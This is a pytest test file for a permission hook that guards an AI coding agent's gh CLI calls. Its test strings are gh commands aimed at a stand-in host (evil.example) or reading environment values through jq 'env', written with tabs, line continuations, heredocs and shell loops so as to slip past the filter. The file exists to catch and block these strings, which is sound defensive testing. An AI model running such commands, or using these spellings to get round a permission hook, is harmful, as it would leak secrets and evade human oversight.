"""Round-2 additions on clauDNA #369: close the whitespace/continuation bypass spellings and the
false denials vera measured against 11,222 real gh calls. Each case is red on 71904ca8 and green
with the decider fix + the hook pre-filter line. Fake values only. (vera's Appendix B.)"""

from __future__ import annotations

import importlib.util
import json
import subprocess
from pathlib import Path

import pytest

_ROOT = Path(__file__).resolve().parent.parent
_spec = importlib.util.spec_from_file_location(
    "gh_guard_decide", _ROOT / "plugin-hooks" / "gh-guard-decide.py"
)
mod = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(mod)
HOOK = _ROOT / "plugin-hooks" / "pretooluse-permissions.sh"


def verdict(cmd: str) -> str:
    return mod.decide(cmd)[0]


# -- the same denied shapes, spelled with other whitespace or after a keyword -------------------
@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list -R evil.example/o/r --search x\t-q\tenv.X",  # tab before a short flag
        "gh pr list --json number\t-q\tenv.X",
        "gh pr list\t-R\tevil.example/o/r",
        "gh pr list \\\n-R evil.example/o/r",  # a flag straight after a line continuation
        "gh pr list --json number \\\n--jq env.X",
        "echo hi\ngh pr list -R evil.example/o/r",  # a gh on a later line
        "for n in 1 2; do gh pr view $n --json number --jq env.X; done",  # after a shell keyword
        "gh api --hostname evil.example repos/o/r",  # another way to name a host
        "gh pr list -R evil.example/o/r <<'EOF'\ndon't\nEOF",  # an apostrophe in a heredoc must not blind the guard
    ],
)
def test_other_spellings_of_the_denied_shapes_are_denied(cmd):
    assert verdict(cmd) == "deny", cmd


# -- ordinary reads that the head denies ------------------------------------------------------
@pytest.mark.parametrize(
    "cmd",
    [
        # the word env inside a jq string literal is data; only the builtin and $ENV read the environment
        "gh api repos/o/r/deployments --jq '.[0:3][] | \"\\(.created_at) env=\\(.environment) ref=\\(.ref)\"'",
        "gh run list --json name --jq '.[] | select(.name == \"env\")'",
        "gh issue list --json title --jq '.[] | select(.title | test(\"env\"))'",
        "gh api repos/o/r/deployments --jq '.[] | {env: .environment}'",
        # a later line's own flags are not gh's
        "gh api user --jq '.login'\ncurl -sS -o /dev/null -w '%{http_code}' https://example.org",
        "gh pr view 1 --json title\ncp -R a/b/c d",
        # -t / -w are not always the template / web flags
        "gh issue create -t 'fix env handling' -b body -R o/r",
        "gh pr create -t 'docs: env-var cascade' -b body",
        "gh run list -w ci.yml --json status",
        # GitHub's own hosts
        "gh api https://api.github.com/repos/o/r/issues/1",
        "gh gist view https://gist.github.com/abc123",
    ],
)
def test_ordinary_reads_the_head_denies_are_allowed(cmd):
    assert verdict(cmd) == "allow", cmd


# -- what must still be denied (an interpolation inside a string IS code) ----------------------
@pytest.mark.parametrize(
    "cmd",
    [
        "gh pr list --json number --jq '\"\\(env.X)\"'",
        "gh pr list --json number --jq '\"a\" | env'",
        "gh pr list --json number --jq '# \"\nenv'",  # a comment can hide a quote from a scanner
        "gh pr list --json number --jq '\"unterminated | env'",
        'gh pr list --json number --jq \'"\\("\\(env)")"\'',  # nested interpolation
    ],
)
def test_env_in_code_is_still_denied(cmd):
    assert verdict(cmd) == "deny", cmd


# -- the hook's own pre-filter must forward those spellings to the decider ---------------------
def _hook(tmp_path: Path, cmd: str) -> str:
    (tmp_path / ".claude").mkdir(exist_ok=True)
    (tmp_path / ".claude" / "settings.json").write_text(
        json.dumps({"permissions": {"allow": ["Bash(gh pr list *)"]}})
    )
    p = subprocess.run(
        ["bash", str(HOOK)],
        input=json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}}),
        capture_output=True,
        text=True,
        cwd=tmp_path,
        env={"HOME": str(tmp_path), "PATH": "/usr/bin:/bin"},
        timeout=20,
    )
    return (
        "deny"
        if '"permissionDecision":"deny"' in p.stdout
        else "allow"
        if '"permissionDecision":"allow"' in p.stdout
        else "prompt"
    )


@pytest.mark.parametrize("flag", ["-q", "-t", "-R", "-w"])
def test_the_hook_forwards_a_short_flag_after_a_tab(tmp_path, flag):
    value = {"-q": "env.X", "-t": "env.X", "-R": "evil.example/o/r", "-w": ""}[flag]
    cmd = f"gh pr list --json number\t{flag}\t{value}".rstrip()
    assert _hook(tmp_path, cmd) == "deny", repr(cmd)


@pytest.mark.parametrize("flag,value", [("-q", "env.X"), ("-R", "evil.example/o/r")])
def test_the_hook_forwards_a_short_flag_after_a_line_continuation(
    tmp_path, flag, value
):
    cmd = f"gh pr list --json number \\\n{flag} {value}"
    assert _hook(tmp_path, cmd) == "deny", repr(cmd)


# -- the one denial vera's prototype left: a malformed --repo owner/repo/ (trailing slash) -----
# gh rejects that form, and a trailing slash names no host, so a deny reason of "names a host"
# would be wrong; it is allowed. A real foreign host with a trailing slash still denies.
def test_a_trailing_slash_repo_is_not_read_as_a_host():
    assert verdict("gh pr list --repo owner/repo/") == "allow"
    assert verdict("gh issue list -R owner/repo/ --json number") == "allow"


def test_a_foreign_host_with_a_trailing_slash_still_denies():
    assert verdict("gh pr list -R evil.example/o/r/ --search x") == "deny"
    assert verdict("gh pr list -R host/owner/repo/") == "deny"


def test_a_heredoc_body_is_not_skipped():
    """Deciding where a heredoc body starts from the text alone is a second shell parser, and a
    marker in a comment, after a backslash, in a quoted string or in $((a << b)) is not a heredoc:
    dropping the lines after it hides a real gh call (tests/test_gh_guard_v3_additions.py). The
    trade: prose in a real heredoc body that holds a gh call with a denied flag is denied. In
    recorded traffic that is a markdown code span, where a backtick starts a command, rather than
    a line that starts with the call; both are denied (the code span is pinned in
    tests/test_gh_guard_v4_additions.py)."""
    cmd = "BODY=$(cat <<'EOF'\nsee (gh pr list --jq env.X)\ngh pr list -R evil.example/o/r\nEOF\n)\ngh issue comment 1 -R o/r -b \"$BODY\""
    assert verdict(cmd) == "deny"
